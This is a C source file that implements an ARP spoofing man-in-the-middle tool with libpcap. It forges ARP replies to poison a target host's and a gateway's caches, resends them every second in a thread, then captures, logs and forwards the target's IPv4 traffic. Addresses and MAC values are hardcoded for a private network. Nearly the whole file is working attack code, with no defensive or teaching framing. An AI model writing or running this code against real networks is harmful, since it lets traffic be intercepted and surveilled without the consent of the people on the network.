#include "../headers/net_structure.h"
#include <pthread.h>

// Function prototypes
void ifprint(pcap_if_t *d);

char *iptos(u_long in);

void list_dev();

pcap_t *open_adapter();

void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data);

arp_packet deceive_dst_packet, deceive_gateway_packet;
pcap_t *adapter;
u_char dst_mac[] = {0x58, 0x91, 0xcf, 0x98, 0x7b, 0xff};
u_char dst_ip[] = {192, 168, 43, 215};
u_char src_mac[] = {0xB8, 0xEE, 0x65, 0x6B, 0x35, 0xC5};
u_char src_ip[] = {192, 168, 43, 57};
u_char gateway_mac[] = {0x22, 0x47, 0xda, 0x58, 0x88, 0x8c};
u_char gateway_ip[] = {192, 168, 43, 1};

void init_packet() {
    adapter = open_adapter();

    memcpy(deceive_dst_packet.eth_hdr.dst_mac, dst_mac, 6);
    memcpy(deceive_dst_packet.eth_hdr.src_mac, src_mac, 6);
    deceive_dst_packet.eth_hdr.type = htons(0x0806);
    deceive_dst_packet.arp_hdr.hardware_type = htons(0x0001);
    deceive_dst_packet.arp_hdr.proto_type = htons(0x0800);
    deceive_dst_packet.arp_hdr.hardware_size = 0x06;
    deceive_dst_packet.arp_hdr.proto_size = 0x04;
    deceive_dst_packet.arp_hdr.opcode = htons(0x0002);
    memcpy(deceive_dst_packet.arp_hdr.src_mac, src_mac, 6);
    memcpy(deceive_dst_packet.arp_hdr.src_ip, gateway_ip, 4);
    memcpy(deceive_dst_packet.arp_hdr.dst_mac, dst_mac, 6);
    memcpy(deceive_dst_packet.arp_hdr.dst_ip, dst_ip, 4);

    memcpy(deceive_gateway_packet.eth_hdr.dst_mac, gateway_mac, 6);
    memcpy(deceive_gateway_packet.eth_hdr.src_mac, src_mac, 6);
    deceive_gateway_packet.eth_hdr.type = htons(0x0806);
    deceive_gateway_packet.arp_hdr.hardware_type = htons(0x0001);
    deceive_gateway_packet.arp_hdr.proto_type = htons(0x0800);
    deceive_gateway_packet.arp_hdr.hardware_size = 0x06;
    deceive_gateway_packet.arp_hdr.proto_size = 0x04;
    deceive_gateway_packet.arp_hdr.opcode = htons(0x0002);
    memcpy(deceive_gateway_packet.arp_hdr.src_mac, src_mac, 6);
    memcpy(deceive_gateway_packet.arp_hdr.src_ip, dst_ip, 4);
    memcpy(deceive_gateway_packet.arp_hdr.dst_mac, gateway_mac, 6);
    memcpy(deceive_gateway_packet.arp_hdr.dst_ip, gateway_ip, 4);
}

void *arp_spoofing(void *arg) {
    while (true) {
        // Send down the deceive_dst_packet
        if (pcap_sendpacket(adapter,                                 // Adapter
                            (const u_char *) &deceive_dst_packet,    // buffer with the deceive_dst_packet
                            sizeof(deceive_dst_packet)               // size
        ) != 0) {
            fprintf(stderr, "\nError sending the deceive_dst_packet: %s\n", pcap_geterr(adapter));
            return nullptr;
        }
        if (pcap_sendpacket(adapter,                                        // Adapter
                            (const u_char *) &deceive_gateway_packet,       // buffer with the deceive_dst_packet
                            sizeof(deceive_gateway_packet)                  // size
        ) != 0) {
            fprintf(stderr, "\nError sending the deceive_dst_packet: %s\n", pcap_geterr(adapter));
            return nullptr;
        }
        sleep(1);
    }
}

int main() {
    list_dev();

    init_packet();

    pthread_t tid;
    pthread_create(&tid, nullptr, &arp_spoofing, nullptr);

    //start the capture
    pcap_loop(adapter, 0, packet_handler, NULL);

    pcap_close(adapter);
    getchar();

    return 0;
}

/* Callback function invoked by libpcap for every incoming packet */
void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data) {
    struct tm ltime;
    char timestr[16];
    ethernet_header *eh;
    ip_header *ih;
    udp_header *uh;
    u_int ip_len;
    u_short sport, dport;
    time_t local_tv_sec;

    /*
     * Unused variable
     */
    (void) (param);

    /* convert the timestamp to readable format */
    //local_tv_sec = header->ts.tv_sec;
    //localtime(&ltime);
    //strftime(timestr, sizeof timestr, "%H:%M:%S", &ltime);

    /* print timestamp and length of the packet */
    //printf("%s.%.6ld len:%d\n", timestr, header->ts.tv_usec, header->len);

    eh = (ethernet_header *) pkt_data;
    /*printf("MAC Address: %X:%X:%X:%X:%X:%X -> %X:%X:%X:%X:%X:%X\n",
           eh->src_mac[0], eh->src_mac[1], eh->src_mac[2], eh->src_mac[3], eh->src_mac[4], eh->src_mac[5],
           eh->dst_mac[0], eh->dst_mac[1], eh->dst_mac[2], eh->dst_mac[3], eh->dst_mac[4], eh->dst_mac[5]);*/
    //printf("%lx",eh->type);

    usleep(100000);
    if (eh->type == htons(0x0800))    // IPv4 is 0x0800
    {
        /* retireve the position of the ip header */
        ih = (ip_header *) (pkt_data +
                            sizeof(ethernet_header)); //length of ethernet heade
        if (!memcmp((void *) &ih->daddr, dst_ip, 4)) {
            printf("To Target:\t%d%d.%d.%d\t -> %d.%d.%d.%d\tlen:%d\n",
                   ih->saddr.byte1,
                   ih->saddr.byte2,
                   ih->saddr.byte3,
                   ih->saddr.byte4,

                   ih->daddr.byte1,
                   ih->daddr.byte2,
                   ih->daddr.byte3,
                   ih->daddr.byte4,

                   header->len);
            memcpy(eh->dst_mac, dst_mac, 6);
            memcpy(eh->src_mac, src_mac, 6);
            pcap_sendpacket(adapter,                                // Adapter
                            (const u_char *) pkt_data,   // buffer with the deceive_dst_packet
                            header->len                             // size
            );

        } else if (!memcmp((void *) &ih->saddr, dst_ip, 4)) {
            printf("From Target:\t%d.%d.%d.%d\t -> %d.%d.%d.%d\tlen:%d\n",
                   ih->saddr.byte1,
                   ih->saddr.byte2,
                   ih->saddr.byte3,
                   ih->saddr.byte4,

                   ih->daddr.byte1,
                   ih->daddr.byte2,
                   ih->daddr.byte3,
                   ih->daddr.byte4,

                   header->len);
            memcpy(eh->dst_mac, gateway_mac, 6);
            memcpy(eh->src_mac, src_mac, 6);
            if (pcap_sendpacket(adapter,                                // Adapter
                            (const u_char *) pkt_data,   // buffer with the deceive_dst_packet
                            header->len                             // size
            ) != 0)
                fprintf(stderr, "\nError sending the Retrans_packet to : %s\n", pcap_geterr(adapter));
        }
    }
}

pcap_t *open_adapter() {
    pcap_t *fp;
    const char *broadcom = "wlp3s0";
    char errbuf[PCAP_ERRBUF_SIZE] = "wlp3s0", *dev;

    dev = pcap_lookupdev(errbuf);
    if (dev == NULL) {
        fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
        return NULL;
    }
    printf("Device: %s\n", dev);

    if ((fp = pcap_open_live(dev,        // name of the device
                             65536,                                // portion of the packet to capture.
            // 65536 grants that the whole packet will be captured on all the MACs.
                             1,                                    // promiscuous mode (nonzero means promiscuous)
                             10,                                // read timeout
                             errbuf                                // error buffer
    )) == NULL) {
        fprintf(stderr, "\nUnable to open the adapter.\n");
        return NULL;
    } else return fp;
}

void list_dev() {
    char error[PCAP_ERRBUF_SIZE];
    pcap_if_t *interfaces, *temp;
    int i = 0;
    if (pcap_findalldevs(&interfaces, error) == -1) {
        printf("\nerror in pcap findall devs");
        return;
    }

    printf("\n the interfaces present on the system are:");
    for (temp = interfaces; temp; temp = temp->next) {
        printf("\n%d  :  %s", i++, temp->name);

    }
    pcap_freealldevs(interfaces);
}
